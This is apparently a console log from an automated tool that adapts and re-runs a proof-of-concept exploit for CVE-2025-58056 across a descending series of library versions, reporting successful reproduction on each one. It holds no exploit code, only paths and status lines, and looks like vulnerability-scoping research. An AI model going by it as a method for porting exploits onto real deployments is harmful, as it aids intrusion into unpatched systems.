[92m[Executor] Direct reproduction successful on 4.0.35.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.35.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.34.Final[0m
[96m[Selector] Closest reproduced version: 4.0.35.Final at index 56[0m
[96m[Adapter] Trying next closest version: 4.0.34.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.35.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.34.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.34.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.34.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.34.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.34.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.34.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.34.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.34.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.34.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.33.Final[0m
[96m[Selector] Closest reproduced version: 4.0.34.Final at index 55[0m
[96m[Adapter] Trying next closest version: 4.0.33.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.34.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.33.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.33.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.33.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.33.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.33.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.33.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.33.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.33.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.33.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.32.Final[0m
[96m[Selector] Closest reproduced version: 4.0.33.Final at index 54[0m
[96m[Adapter] Trying next closest version: 4.0.32.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.33.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.32.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.32.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.32.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.32.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.32.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.32.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.32.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.32.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.32.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.31.Final[0m
[96m[Selector] Closest reproduced version: 4.0.32.Final at index 53[0m
[96m[Adapter] Trying next closest version: 4.0.31.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.32.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.31.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.31.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.31.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.31.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.31.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.31.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.31.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.31.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.31.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.30.Final[0m
[96m[Selector] Closest reproduced version: 4.0.31.Final at index 52[0m
[96m[Adapter] Trying next closest version: 4.0.30.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.31.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.30.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.30.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.30.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.30.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.30.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.30.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.30.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.30.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.30.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.29.Final[0m
[96m[Selector] Closest reproduced version: 4.0.30.Final at index 51[0m
[96m[Adapter] Trying next closest version: 4.0.29.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.30.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.29.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.29.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.29.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.29.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.29.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.29.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.29.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.29.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.29.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.28.Final[0m
[96m[Selector] Closest reproduced version: 4.0.29.Final at index 50[0m
[96m[Adapter] Trying next closest version: 4.0.28.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.29.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.28.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.28.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.28.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.28.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.28.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.28.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.28.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.28.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.28.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.27.Final[0m
[96m[Selector] Closest reproduced version: 4.0.28.Final at index 49[0m
[96m[Adapter] Trying next closest version: 4.0.27.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.28.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.27.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.27.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.27.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.27.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.27.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.27.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.27.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.27.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.27.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.26.Final[0m
[96m[Selector] Closest reproduced version: 4.0.27.Final at index 48[0m
[96m[Adapter] Trying next closest version: 4.0.26.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.27.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.26.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.26.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.26.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.26.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.26.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.26.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.26.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.26.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.26.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.25.Final[0m
[96m[Selector] Closest reproduced version: 4.0.26.Final at index 47[0m
[96m[Adapter] Trying next closest version: 4.0.25.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.26.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.25.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.25.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.25.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.25.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.25.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.25.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.25.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.25.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.25.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.24.Final[0m
[96m[Selector] Closest reproduced version: 4.0.25.Final at index 46[0m
[96m[Adapter] Trying next closest version: 4.0.24.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.25.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.24.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.24.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.24.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.24.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.24.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.24.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.24.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.24.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.24.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.23.Final[0m
[96m[Selector] Closest reproduced version: 4.0.24.Final at index 45[0m
[96m[Adapter] Trying next closest version: 4.0.23.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.24.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.23.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.23.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.23.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.23.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.23.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.23.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.23.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.23.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.23.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.22.Final[0m
[96m[Selector] Closest reproduced version: 4.0.23.Final at index 44[0m
[96m[Adapter] Trying next closest version: 4.0.22.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.23.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.22.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.22.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.22.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.22.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.22.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.22.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.22.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.22.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.22.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.21.Final[0m
[96m[Selector] Closest reproduced version: 4.0.22.Final at index 43[0m
[96m[Adapter] Trying next closest version: 4.0.21.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.22.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.21.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.21.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.21.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.21.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.21.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.21.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.21.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.21.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.21.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.20.Final[0m
[96m[Selector] Closest reproduced version: 4.0.21.Final at index 42[0m
[96m[Adapter] Trying next closest version: 4.0.20.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.21.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.20.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.20.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.20.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.20.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.20.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.20.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.20.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.20.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.20.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.19.Final[0m
[96m[Selector] Closest reproduced version: 4.0.20.Final at index 41[0m
[96m[Adapter] Trying next closest version: 4.0.19.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.20.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.19.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.19.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.19.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.19.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.19.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.19.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.19.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.19.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.19.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.18.Final[0m
[96m[Selector] Closest reproduced version: 4.0.19.Final at index 40[0m
[96m[Adapter] Trying next closest version: 4.0.18.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.19.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.18.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.18.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.18.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.18.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.18.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.18.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.18.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.18.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.18.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.17.Final[0m
[96m[Selector] Closest reproduced version: 4.0.18.Final at index 39[0m
[96m[Adapter] Trying next closest version: 4.0.17.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.18.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.17.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.17.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.17.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.17.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.17.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.17.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.17.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.17.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.17.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.16.Final[0m
[96m[Selector] Closest reproduced version: 4.0.17.Final at index 38[0m
[96m[Adapter] Trying next closest version: 4.0.16.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.17.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.16.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.16.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.16.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.16.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.16.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.16.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.16.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.16.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.16.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.15.Final[0m
[96m[Selector] Closest reproduced version: 4.0.16.Final at index 37[0m
[96m[Adapter] Trying next closest version: 4.0.15.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.16.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.15.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.15.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.15.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.15.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.15.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.15.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.15.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.15.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.15.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.14.Final[0m
[96m[Selector] Closest reproduced version: 4.0.15.Final at index 36[0m
[96m[Adapter] Trying next closest version: 4.0.14.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.15.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.14.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.14.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.14.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.14.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.14.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.14.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.14.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.14.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.14.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.14.Beta1[0m
[96m[Selector] Closest reproduced version: 4.0.14.Final at index 35[0m
[96m[Adapter] Trying next closest version: 4.0.14.Beta1[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.14.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.14.Beta1/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.14.Beta1 in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.14.Beta1/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.14.Beta1 in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.14.Beta1/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.14.Beta1...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.14.Beta1...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
